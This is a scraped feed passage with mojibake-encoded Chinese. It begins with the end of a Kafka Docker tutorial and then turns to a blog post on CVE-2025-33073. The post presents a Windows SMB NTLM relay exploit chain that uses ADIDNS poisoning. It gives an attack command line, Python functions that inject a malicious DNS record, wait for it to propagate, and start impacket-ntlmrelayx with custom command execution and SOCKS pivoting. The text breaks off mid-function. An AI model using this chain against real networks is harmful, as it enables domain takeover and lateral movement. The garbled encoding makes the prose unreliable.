    <span class="hljs-attr">data</span> = json.loads(message.value.decode(<span class="hljs-string">'utf-8'</span>))
    print(f"Consumed message: {data}")
</code></pre>
<h3 data-id="heading-11">ä¸‰ã€ä½¿ç”¨æ­¥éª¤</h3>
<ol>
<li>
<p><strong>å¯åŠ¨Kafkaå’ŒKafka-UI</strong>ï¼š</p>
<pre><code class="hljs">docker-compose up -d
</code></pre>
</li>
<li>
<p><strong>è¿è¡Œç”Ÿäº§è€…</strong>ï¼š</p>
<pre><code class="hljs">python producer.py
</code></pre>
</li>
<li>
<p><strong>è¿è¡Œæ¶ˆè´¹è€…</strong>ï¼š</p>
<pre><code class="hljs">python consumer.py
</code></pre>
</li>
<li>
<p><strong>ä½¿ç”¨Kafka-UI</strong>ï¼š</p>
<ul>
<li>è®¿é—® <code>http://localhost:8080</code></li>
<li>åœ¨Kafka-UIç•Œé¢ä¸­ï¼Œæ‚¨å¯ä»¥æŸ¥çœ‹é›†ç¾¤çŠ¶æ€ã€ä¸»é¢˜ã€æ¶ˆè´¹è€…ç»„ç­‰ä¿¡æ¯</li>
</ul>
</li>
</ol>
<h3 data-id="heading-12">å››ã€å¸¸è§é—®é¢˜è§£å†³</h3>
<ol>
<li>
<p><strong>Kafka-UIæ— æ³•è®¿é—®</strong>ï¼š</p>
<ul>
<li>ç¡®è®¤ç«¯å£æ˜ å°„æ˜¯å¦æ­£ç¡®ï¼š<code>- "8080:8080"</code></li>
<li>æ£€æŸ¥å®¹å™¨æ—¥å¿—ï¼š<code>docker logs kafka-ui</code></li>
</ul>
</li>
<li>
<p><strong>Pythonè„šæœ¬è¿æ¥é—®é¢˜</strong>ï¼š</p>
<ul>
<li>ç¡®è®¤KafkaæœåŠ¡å·²å¯åŠ¨ï¼š<code>docker-compose ps</code></li>
<li>ç¡®è®¤ç”Ÿäº§è€…/æ¶ˆè´¹è€…ä»£ç ä¸­çš„<code>bootstrap_servers</code>ä¸å®é™…ç«¯å£ä¸€è‡´ï¼ˆ<code>localhost:9092</code>ï¼‰</li>
</ul>
</li>
<li>
<p><strong>KafkaæœåŠ¡å¯åŠ¨å¤±è´¥</strong>ï¼š</p>
<ul>
<li>æ£€æŸ¥Dockeræ—¥å¿—ï¼š<code>docker logs kafka</code></li>
<li>ç¡®è®¤ZookeeperæœåŠ¡å·²å¯åŠ¨ï¼ˆKafkaä¾èµ–äºZookeeperï¼‰</li>
</ul>
</li>
</ol>
<h3 data-id="heading-13">äº”ã€Kafka-UIåŠŸèƒ½ç®€ä»‹</h3>
<p>Kafka-UIæä¾›äº†ä»¥ä¸‹å®ç”¨åŠŸèƒ½ï¼š</p>
<ul>
<li><strong>é›†ç¾¤ç›‘æ§</strong>ï¼šæŸ¥çœ‹é›†ç¾¤å¥åº·çŠ¶æ€ã€ç‰ˆæœ¬ä¿¡æ¯</li>
<li><strong>ä¸»é¢˜ç®¡ç†</strong>ï¼šåˆ›å»ºã€ä¿®æ”¹ã€åˆ é™¤ä¸»é¢˜</li>
<li><strong>æ¶ˆè´¹è€…ç»„ç®¡ç†</strong>ï¼šæŸ¥çœ‹å’Œç®¡ç†æ¶ˆè´¹è€…ç»„</li>
<li><strong>å®æ—¶æµé‡ç›‘æ§</strong>ï¼šæŸ¥çœ‹ç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…çš„æµé‡</li>
<li><strong>ä¸»é¢˜è¯¦æƒ…</strong>ï¼šæŸ¥çœ‹ä¸»é¢˜çš„åˆ†åŒºã€å‰¯æœ¬ç­‰ä¿¡æ¯</li>
</ul>
<p>é€šè¿‡ä»¥ä¸Šæ­¥éª¤ï¼Œå®ŒæˆKafkaçš„éƒ¨ç½²å’Œå¯è§†åŒ–ç®¡ç†é¢æ¿çš„é…ç½®ï¼Œå¹¶å¼€å§‹ä½¿ç”¨Pythonè¿›è¡ŒKafkaæ¶ˆæ¯çš„ç”Ÿäº§å’Œæ¶ˆè´¹ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ­ç§˜CVE-2025-33073ï¼šWindows SMBå®¢æˆ·ç«¯NTLMä¸­ç»§æ”»å‡»ä¸ADIDNSæŠ•æ¯’åˆ©ç”¨é“¾]]></title>    <link>https://juejin.cn/post/7592432859863957538</link>    <guid>https://juejin.cn/post/7592432859863957538</guid>    <pubDate>2026-01-08T01:49:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592432859863957538" data-draft-id="7592432859863924770" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ­ç§˜CVE-2025-33073ï¼šWindows SMBå®¢æˆ·ç«¯NTLMä¸­ç»§æ”»å‡»ä¸ADIDNSæŠ•æ¯’åˆ©ç”¨é“¾"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,AIGC"/> <meta itemprop="datePublished" content="2026-01-08T01:49:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="qife122"/> <meta itemprop="url" content="https://juejin.cn/user/1743174852185579"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ­ç§˜CVE-2025-33073ï¼šWindows SMBå®¢æˆ·ç«¯NTLMä¸­ç»§æ”»å‡»ä¸ADIDNSæŠ•æ¯’åˆ©ç”¨é“¾
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1743174852185579/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    qife122
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T01:49:54.000Z" title="Thu Jan 08 2026 01:49:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">CVE-2025-33073 æ¼æ´åˆ©ç”¨ä¸ADIDNSæŠ•æ¯’æ”»å‡»é“¾</h2>
<h3 data-id="heading-1">é¡¹ç›®æè¿°</h3>
<p>æœ¬é¡¹ç›®æ˜¯é’ˆå¯¹Windows SMBå®¢æˆ·ç«¯æ¼æ´CVE-2025-33073çš„åˆ©ç”¨é“¾ç ”ç©¶å·¥å…·ã€‚è¯¥æ¼æ´æ˜¯ä¸€ä¸ªé«˜ä¸¥é‡æ€§çš„èº«ä»½éªŒè¯è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVSS 8.8ï¼‰ï¼Œå…è®¸æ”»å‡»è€…åœ¨æœªå¯ç”¨SMBç­¾åçš„æƒ…å†µä¸‹ï¼Œé€šè¿‡NTLMä¸­ç»§æ”»å‡»è·å¾—SYSTEMçº§åˆ«çš„ä»£ç æ‰§è¡Œæƒé™ã€‚æœ¬å·¥å…·ç»“åˆäº†ADIDNSï¼ˆActive Directoryé›†æˆDNSï¼‰æŠ•æ¯’æŠ€æœ¯ï¼Œè‡ªåŠ¨åŒ–å®ŒæˆDNSè®°å½•æ³¨å…¥ã€ç­‰å¾…ä¼ æ’­å’Œè§¦å‘SMB NTLMä¸­ç»§çš„å®Œæ•´æ”»å‡»æµç¨‹ï¼Œç”¨äºæ¼”ç¤ºå’Œç ”ç©¶WindowsåŸŸç¯å¢ƒä¸­çš„æ¨ªå‘ç§»åŠ¨é£é™©ã€‚</p>
<h3 data-id="heading-2">åŠŸèƒ½ç‰¹æ€§</h3>
<ul>
<li><strong>è‡ªåŠ¨åŒ–æ”»å‡»é“¾</strong>ï¼šæ•´åˆdnstool.pyä¸impacket-ntlmrelayxï¼Œå®ç°ä¸€é”®åŒ–æ”»å‡»æµç¨‹</li>
<li><strong>ADIDNSæŠ•æ¯’</strong>ï¼šé€šè¿‡LDAPåè®®å‘Active Directoryæ·»åŠ æ¶æ„DNSè®°å½•</li>
<li><strong>æ™ºèƒ½ç­‰å¾…æœºåˆ¶</strong>ï¼šè‡ªåŠ¨ç›‘æ§DNSè®°å½•ä¼ æ’­çŠ¶æ€ï¼Œç¡®ä¿æŠ•æ¯’æˆåŠŸ</li>
<li><strong>çµæ´»çš„NTLMä¸­ç»§å¯åŠ¨</strong>ï¼šæ”¯æŒåœ¨å½“å‰ç»ˆç«¯æˆ–æ–°å»ºxtermçª—å£ä¸­å¯åŠ¨ntlmrelayxç›‘å¬å™¨</li>
<li><strong>æ”¯æŒè‡ªå®šä¹‰å‘½ä»¤æ‰§è¡Œ</strong>ï¼šå¯åœ¨ä¸­ç»§æˆåŠŸæ—¶æ‰§è¡ŒæŒ‡å®šçš„ç³»ç»Ÿå‘½ä»¤</li>
<li><strong>SOCKSä»£ç†æ”¯æŒ</strong>ï¼šå¯é€‰å¼€å¯SOCKSä»£ç†è¿›è¡Œè¿›ä¸€æ­¥çš„ç½‘ç»œæ¸—é€</li>
</ul>
<h3 data-id="heading-3">å®‰è£…æŒ‡å—</h3>
<h4 data-id="heading-4">ç³»ç»Ÿè¦æ±‚</h4>
<ul>
<li>Python 3.x</li>
<li>ç±»Unixæ“ä½œç³»ç»Ÿï¼ˆæ”¯æŒxtermç»ˆç«¯ï¼‰</li>
<li>ç½‘ç»œè®¿é—®æƒé™ï¼ˆå¯è®¿é—®ç›®æ ‡åŸŸæ§DNSæœåŠ¡å™¨ï¼‰</li>
</ul>
<h4 data-id="heading-5">ä¾èµ–å®‰è£…</h4>
<p>é¡¹ç›®ä¾èµ–äºä»¥ä¸‹Pythonåº“ï¼Œå¯é€šè¿‡pipå®‰è£…ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">pip install impacket ldap3 dnspython
</code></pre>
<h4 data-id="heading-6">å·¥å…·ä¾èµ–</h4>
<p>ç¡®ä¿ç³»ç»Ÿä¸­å·²å®‰è£…ä»¥ä¸‹å®‰å…¨å·¥å…·ï¼š</p>
<ul>
<li><strong>impacketå¥—ä»¶</strong>ï¼šç‰¹åˆ«æ˜¯<code>ntlmrelayx</code>å·¥å…·</li>
<li><strong>digå‘½ä»¤</strong>ï¼šç”¨äºDNSæŸ¥è¯¢æµ‹è¯•ï¼ˆé€šå¸¸åŒ…å«åœ¨<code>dnsutils</code>åŒ…ä¸­ï¼‰</li>
<li><strong>xtermç»ˆç«¯</strong>ï¼šå¯é€‰ï¼Œç”¨äºåœ¨æ–°çª—å£ä¸­è¿è¡Œç›‘å¬å™¨</li>
</ul>
<h4 data-id="heading-7">é…ç½®è¯´æ˜</h4>
<p>æ— éœ€é¢å¤–é…ç½®æ–‡ä»¶ï¼Œæ‰€æœ‰å‚æ•°é€šè¿‡å‘½ä»¤è¡Œä¼ é€’ã€‚</p>
<h3 data-id="heading-8">ä½¿ç”¨è¯´æ˜</h3>
<h4 data-id="heading-9">åŸºæœ¬ç”¨æ³•</h4>
<p>è¯¥å·¥å…·æ˜¯ä¸€ä¸ªPythonè„šæœ¬ï¼Œéœ€è¦æä¾›åŸŸç”¨æˆ·å‡­æ®ã€æ”»å‡»è€…IPã€DNSæœåŠ¡å™¨IPå’ŒåŸŸæ§FQDNç­‰ä¿¡æ¯ã€‚</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ç¤ºä¾‹ï¼šæ‰§è¡Œå®Œæ•´çš„æ”»å‡»é“¾</span>
./exploit_chain.py -u domain_user -p password -a attacker_ip -d dns_server_ip -dc dc.domain.com -t target_machine
</code></pre>
<h4 data-id="heading-10">å‚æ•°è¯¦è§£</h4>
<ul>
<li><code>-u, --user</code>ï¼šåŸŸç”¨æˆ·åï¼ˆæ ¼å¼ï¼šDOMAIN\User æˆ– Userï¼‰</li>
<li><code>-p, --password</code>ï¼šç”¨æˆ·å¯†ç </li>
<li><code>-a, --attacker-ip</code>ï¼šæ”»å‡»è€…æ§åˆ¶çš„IPåœ°å€ï¼ˆç”¨äºDNSè®°å½•æŒ‡å‘ï¼‰</li>
<li><code>-d, --dns-ip</code>ï¼šç›®æ ‡åŸŸDNSæœåŠ¡å™¨IPåœ°å€</li>
<li><code>-dc, --dc-fqdn</code>ï¼šåŸŸæ§åˆ¶å™¨çš„å®Œå…¨é™å®šåŸŸå</li>
<li><code>-t, --target</code>ï¼šSMBä¸­ç»§çš„ç›®æ ‡æœºå™¨IPæˆ–ä¸»æœºå</li>
<li><code>--timeout</code>ï¼šç­‰å¾…DNSä¼ æ’­çš„è¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼Œé»˜è®¤60ï¼‰</li>
<li><code>--cli-only</code>ï¼šä»…åœ¨å½“å‰å‘½ä»¤è¡Œå¯åŠ¨ntlmrelayxï¼Œä¸å¼€æ–°çª—å£</li>
<li><code>-c, --command</code>ï¼šä¸­ç»§æˆåŠŸæ—¶æ‰§è¡Œçš„è‡ªå®šä¹‰ç³»ç»Ÿå‘½ä»¤</li>
<li><code>--socks</code>ï¼šå¯ç”¨SOCKSä»£ç†æ¨¡å¼</li>
</ul>
<h4 data-id="heading-11">å…¸å‹æ”»å‡»åœºæ™¯</h4>
<ol>
<li><strong>å†…éƒ¨ç½‘ç»œæ¨ªå‘ç§»åŠ¨</strong>ï¼šåœ¨å·²è·å¾—ä¸€ä¸ªåŸŸç”¨æˆ·å‡­æ®çš„æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…åˆ©ç”¨æ­¤å·¥å…·å‘ADIDNSæ³¨å…¥æŒ‡å‘å…¶æ§åˆ¶æœåŠ¡å™¨çš„DNSè®°å½•ï¼Œç„¶åè¯±å¯¼ç›®æ ‡ä¸»æœºå‘èµ·SMBè¿æ¥ï¼Œé€šè¿‡NTLMä¸­ç»§è·å¾—æ›´é«˜æƒé™ã€‚</li>
<li><strong>æƒé™æå‡</strong>ï¼šç»“åˆå…¶ä»–æ¼æ´æˆ–ç¤¾ä¼šå·¥ç¨‹å­¦ï¼Œè§¦å‘åŸŸå†…ä¸»æœºå‘æ¶æ„DNSè®°å½•æŒ‡å‘çš„æœåŠ¡å™¨è¿›è¡Œèº«ä»½éªŒè¯ï¼Œä»è€Œä¸­ç»§è¯¥èº«ä»½éªŒè¯åˆ°åŸŸæ§åˆ¶å™¨æˆ–å…¶ä»–é«˜ä»·å€¼ç›®æ ‡ã€‚</li>
</ol>
<h3 data-id="heading-12">æ ¸å¿ƒä»£ç </h3>
<h4 data-id="heading-13">1. DNSè®°å½•æ·»åŠ å‡½æ•°</h4>
<p>æ­¤å‡½æ•°è°ƒç”¨å¤–éƒ¨çš„<code>dnstool.py</code>è„šæœ¬ï¼Œé€šè¿‡LDAPå‘Active Directoryæ·»åŠ ä¸€æ¡é™æ€çš„æ¶æ„DNSè®°å½•ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">run_dnstool</span>(<span class="hljs-params">user, password, attacker_ip, dns_ip, dc_fqdn</span>):
    <span class="hljs-string">"""
    ä½¿ç”¨dnstool.pyæ·»åŠ æ¶æ„DNSè®°å½•åˆ°ADIDNSã€‚
    
    å‚æ•°:
        user: å…·æœ‰å†™å…¥ADIDNSæƒé™çš„åŸŸç”¨æˆ·
        password: å¯¹åº”ç”¨æˆ·çš„å¯†ç 
        attacker_ip: æ”»å‡»è€…æœåŠ¡å™¨IPï¼ŒDNSè®°å½•å°†æŒ‡å‘æ­¤åœ°å€
        dns_ip: ç›®æ ‡åŸŸDNSæœåŠ¡å™¨IP
        dc_fqdn: åŸŸæ§åˆ¶å™¨çš„FQDN
    """</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"[*] Adding malicious DNS record using dnstool.py..."</span>)
    dnstool_cmd = [
        <span class="hljs-string">"python3"</span>, <span class="hljs-string">"dnstool.py"</span>,
        <span class="hljs-string">"-u"</span>, user,
        <span class="hljs-string">"-p"</span>, password,
        <span class="hljs-string">"-a"</span>, <span class="hljs-string">"add"</span>,
        <span class="hljs-string">"-r"</span>, STATIC_DNS_RECORD,  <span class="hljs-comment"># é¢„å®šä¹‰çš„DNSè®°å½•å</span>
        <span class="hljs-string">"-d"</span>, attacker_ip,
        <span class="hljs-string">"-dns-ip"</span>, dns_ip,
        dc_fqdn
    ]
    subprocess.run(dnstool_cmd, check=<span class="hljs-literal">True</span>)  <span class="hljs-comment"># æ‰§è¡Œdnstoolå‘½ä»¤</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"[+] DNS record added."</span>)
</code></pre>
<h4 data-id="heading-14">2. DNSä¼ æ’­ç­‰å¾…å‡½æ•°</h4>
<p>è¯¥å‡½æ•°å¾ªç¯æŸ¥è¯¢DNSæœåŠ¡å™¨ï¼Œç¡®è®¤æ³¨å…¥çš„æ¶æ„è®°å½•å·²æˆåŠŸä¼ æ’­å¹¶ç”Ÿæ•ˆã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">wait_for_dns_record</span>(<span class="hljs-params">record, dns_ip, timeout=<span class="hljs-number">60</span></span>):
    <span class="hljs-string">"""
    ç­‰å¾…æŒ‡å®šçš„DNSè®°å½•åœ¨ç›®æ ‡DNSæœåŠ¡å™¨ä¸Šç”Ÿæ•ˆã€‚
    
    å‚æ•°:
        record: è¦æŸ¥è¯¢çš„DNSè®°å½•åç§°
        dns_ip: ç›®æ ‡DNSæœåŠ¡å™¨IP
        timeout: è¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼‰
    
    è¿”å›:
        bool: æˆåŠŸè§£æåˆ°è®°å½•è¿”å›Trueï¼Œå¦åˆ™è¿”å›False
    """</span>
    timeout = <span class="hljs-built_in">int</span>(timeout)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[*] Waiting for DNS record <span class="hljs-subst">{record}</span> to propagate..."</span>)
    start_time = time.time()
    <span class="hljs-keyword">while</span> time.time() - start_time &lt; timeout:
        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># ä½¿ç”¨digå‘½ä»¤æŸ¥è¯¢DNSè®°å½•</span>
            result = subprocess.run(
                [<span class="hljs-string">"dig"</span>, <span class="hljs-string">"+short"</span>, record, <span class="hljs-string">f"@<span class="hljs-subst">{dns_ip}</span>"</span>],
                capture_output=<span class="hljs-literal">True</span>, text=<span class="hljs-literal">True</span>
            )
            <span class="hljs-keyword">if</span> result.stdout.strip():  <span class="hljs-comment"># å¦‚æœæŸ¥è¯¢ç»“æœéç©º</span>
                <span class="hljs-built_in">print</span>(<span class="hljs-string">"[+] DNS record is live."</span>)
                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[!] Error checking DNS record: <span class="hljs-subst">{e}</span>"</span>)
        time.sleep(<span class="hljs-number">2</span>)  <span class="hljs-comment"># æ¯2ç§’æ£€æŸ¥ä¸€æ¬¡</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"[!] Timeout reached. DNS record not found."</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
</code></pre>
<h4 data-id="heading-15">3. NTLMä¸­ç»§å¯åŠ¨å‡½æ•°</h4>
<p>æ ¹æ®ç”¨æˆ·é€‰æ‹©ï¼Œåœ¨å½“å‰ç»ˆç«¯æˆ–æ–°å»ºçš„xtermçª—å£ä¸­å¯åŠ¨impacketçš„ntlmrelayxç›‘å¬å™¨ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">start_ntlmrelayx</span>(<span class="hljs-params">target, cli_only=<span class="hljs-literal">False</span>, custom_command=<span class="hljs-literal">None</span>, socks=<span class="hljs-literal">False</span></span>):
    <span class="hljs-string">"""
    å¯åŠ¨impacket-ntlmrelayxè¿›è¡ŒSMB NTLMä¸­ç»§ç›‘å¬ã€‚
    
    å‚æ•°:
        target: ä¸­ç»§ç›®æ ‡ï¼ˆå¦‚åŸŸæ§åˆ¶å™¨ï¼‰
        cli_only: ä¸ºTrueåˆ™åœ¨å½“å‰ç»ˆç«¯å¯åŠ¨ï¼Œå¦åˆ™å¼€æ–°xtermçª—å£
        custom_command: ä¸­ç»§æˆåŠŸåæ‰§è¡Œçš„å‘½ä»¤
        socks: æ˜¯å¦å¯ç”¨SOCKSä»£ç†æ¨¡å¼
    """</span>
    <span class="hljs-keyword">if</span> cli_only:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"[*] Starting ntlmrelayx listener in this terminal..."</span>)
        <span class="hljs-comment"># æ„å»ºåŸºæœ¬å‘½ä»¤</span>
        <span class="hljs-keyword">if</span> custom_command:
            cmd = [<span class="hljs-string">"impacket-ntlmrelayx"</span>, <span class="hljs-string">"-t"</span>, target, <span class="hljs-string">"-smb2support"</span>, <span class="hljs-string">"-c"</span>, custom_command]
        <span class="hljs-keyword">else</span>:
            cmd = [<span class="hljs-string">"impacket-ntlmrelayx"</span>, <span class="hljs-string">"-t"</span>, target, <span class="hljs-string">"-smb2support"</span>]
        <span class="hljs-keyword">if</span> socks:
            cmd.append(<span class="hljs-string">"-socks"</span>)  <span class="hljs-comment"># æ·»åŠ SOCKSä»£ç†é€‰é¡¹</span>
        <span class="hljs-keyword">return</span> subprocess.Popen(cmd)  <span class="hljs-comment"># å¯åŠ¨å­è¿›ç¨‹</span>
    <span class="hljs-keyword">else</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"[*] Starting ntlmrelayx listener in a new xterm..."</span>)
        <span class="hljs-comment"># åœ¨xtermä¸­å¯åŠ¨ï¼Œä¿æŒçª—å£æ‰“å¼€</span>
        <span class="hljs-keyword">if</span> custom_command:
            cmd = [<span class="hljs-string">"xterm"</span>, <span class="hljs-string">"-hold"</span>, <span class="hljs-string">"-e"</span>, <span class="hljs-string">"impacket-ntlmrelayx"</span>, <span class="hljs-string">"-t"</span>, target, <span class="hljs-string">"-smb2support"</span>, <span class="hljs-string">"-c"</span>, custom_command]
        <span class="hljs-keyword">else</span>:
            cmd = [<span class="hljs-string">"xterm"</span>, <span class="hljs-string">"-hold"</span>, <span class="hljs-string">"-e"</span>, <span class="hljs-string">"impacket-ntlmrelayx"</span>, <span class="hljs-string">"-t"</span>, target, <span class="hljs-string">"-smb2support"</span>]
        <span class="hljs-keyword">if</span> socks:
            cmd.insert(-<span class="hljs-number">1</span>, <span class="hljs-string">"-socks"</span>)  <span class="hljs-comment"># åœ¨å‘½ä»¤æœ«å°¾å‰æ’å…¥SOCKSé€‰é¡¹</span>
        <span class="hljs-keyword">return</span> subprocess.Popen(cmd)
</code></pre>
<h4 data-id="heading-16">4. ADIDNSå·¥å…·æ ¸å¿ƒäº¤äº’ä»£ç ï¼ˆèŠ‚é€‰è‡ªdnstool.pyï¼‰</h4>
<p>æ­¤éƒ¨åˆ†ä»£ç å±•ç¤ºäº†å¦‚ä½•é€šè¿‡LDAPåè®®ä¸Active Directory DNSåŒºåŸŸè¿›è¡Œäº¤äº’ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_dns_record</span>(<span class="hljs-params">connection, record_name, record_data, dnsserver</span>):
    <span class="hljs-string">"""
    é€šè¿‡LDAPå‘ADIDNSæ·»åŠ ä¸€æ¡DNSè®°å½•ã€‚
    
    å‚æ•°:
        connection: å·²å»ºç«‹çš„LDAPè¿æ¥
        record_name: è¦æ·»åŠ çš„è®°å½•åç§°
        record_data: è®°å½•æ•°æ®ï¼ˆå¦‚IPåœ°å€ï¼‰
        dnsserver: DNSæœåŠ¡å™¨å¯¹è±¡
    """</span>
    <span class="hljs-comment"># æ„å»ºDNSèŠ‚ç‚¹çš„å¯åˆ†è¾¨åç§°ï¼ˆDNï¼‰</span>
    dnsroot = dnsserver.get_dns_root()
    container = <span class="hljs-string">'DC='</span> + record_name + <span class="hljs-string">','</span> + dnsroot
    
